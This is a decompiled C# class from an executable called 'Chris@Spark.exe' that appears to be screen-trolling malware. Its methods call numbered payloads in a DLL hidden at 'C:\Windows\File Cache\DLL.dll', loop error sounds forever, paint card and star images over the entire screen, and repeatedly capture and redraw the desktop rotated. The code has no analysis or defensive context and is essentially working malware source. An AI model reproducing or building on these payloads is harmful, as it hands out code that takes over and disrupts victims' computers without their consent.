// Decompiled with JetBrains decompiler
// Type: Spark.Standard
// Assembly: Spark, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 2DFB06E8-4427-4218-A5F6-F5DE139079B1
// Assembly location: C:\Users\adriel\Downloads\Spark\Chris@Spark.exe

using Spark.Properties;
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Media;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

#nullable disable
namespace Spark;

internal class Standard
{
  [DllImport("C:\\Windows\\File Cache\\DLL.dll", EntryPoint = "?StartProcPayload@Export@SparkDLL@@QAEXH@Z", CharSet = CharSet.Unicode)]
  public static extern void StartProcPayload(int payload);

  [DllImport("user32.dll")]
  private static extern IntPtr GetDC(IntPtr hWnd);

  public static void ShowAllWindows()
  {
    if (!Variables.ShowAllWindowsRan)
      Standard.StartProcPayload(1);
    Variables.ShowAllWindowsRan = true;
  }

  public static void SendMessagePayload()
  {
    if (!Variables.SendMessageRunning)
      Standard.StartProcPayload(2);
    Variables.SendMessageRunning = true;
  }

  public static void ErrorSounds()
  {
    if (Variables.ErrorSoundsRunning)
      return;
    Variables.ErrorSoundsRunning = true;
    while (true)
    {
      switch (new Random().Next(2))
      {
        case 0:
          SystemSounds.Exclamation.Play();
          break;
        case 1:
          SystemSounds.Hand.Play();
          break;
      }
      Thread.Sleep(400);
    }
  }

  public static void GlitchCards()
  {
    Graphics graphics = Graphics.FromHdc(Standard.GetDC(IntPtr.Zero));
    Random random = new Random();
    Bitmap bitmap1 = (Bitmap) null;
    Bitmap bitmap2 = (Bitmap) null;
    Point point = new Point();
    int width = Screen.PrimaryScreen.Bounds.Width;
    int height = Screen.PrimaryScreen.Bounds.Height;
    bool flag1 = true;
    bool flag2 = true;
    while (true)
    {
      switch (random.Next(4))
      {
        case 0:
          bitmap1 = Resources.Card1;
          bitmap2 = new Bitmap((Image) Resources.Card1);
          break;
        case 1:
          bitmap1 = Resources.Card2;
          bitmap2 = new Bitmap((Image) Resources.Card2);
          break;
        case 2:
          bitmap1 = Resources.Card3;
          bitmap2 = new Bitmap((Image) Resources.Card3);
          break;
        case 3:
          bitmap1 = Resources.Card4;
          bitmap2 = new Bitmap((Image) Resources.Card4);
          break;
      }
      graphics.DrawImage((Image) bitmap2, point.X, point.Y);
      if (flag1)
      {
        if (point.X >= width - bitmap1.Width)
          flag1 = false;
        point.X += bitmap1.Width / 4;
      }
      else
      {
        if (point.X <= 0)
          flag1 = true;
        point.X -= bitmap1.Width / 4;
      }
      if (flag2)
      {
        if (point.Y >= height - bitmap1.Height)
          flag2 = false;
        point.Y += bitmap1.Height / 4;
      }
      else
      {
        if (point.Y <= 0)
          flag2 = true;
        point.Y -= bitmap1.Height / 4;
      }
      Thread.Sleep(2);
    }
  }

  public static void ShootingStars()
  {
    Graphics graphics = Graphics.FromHdc(Standard.GetDC(IntPtr.Zero));
    Point point = new Point();
    int width = Screen.PrimaryScreen.Bounds.Width;
    int height = Screen.PrimaryScreen.Bounds.Height;
    Bitmap star = Resources.Star;
    Bitmap bitmap = new Bitmap((Image) Resources.Star);
    if (Variables.ShootingStarsRunning)
      return;
    while (true)
    {
      Thread.Sleep(10);
      graphics.DrawImage((Image) bitmap, point.X, point.Y);
      if (point.Y > height)
        point.Y = 0;
      if (point.X > width)
        point.X = 0;
      point.X += 32 /*0x20*/;
      point.Y += 24;
      Thread.Sleep(2);
    }
  }

  public static void PrintRotate()
  {
    int num = 0;
    while (true)
    {
      IntPtr dc = Standard.GetDC(IntPtr.Zero);
      Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
      Graphics.FromImage((Image) bitmap).CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
      Graphics graphics = Graphics.FromHdc(dc);
      if (num < 9)
      {
        graphics.RotateTransform((float) (num * 10));
        graphics.DrawImage((Image) bitmap, 0, 0);
      }
      else
      {
        graphics.RotateTransform(-90f);
        num = 0;
      }
      ++num;
      Thread.Sleep(500);
    }
  }
}
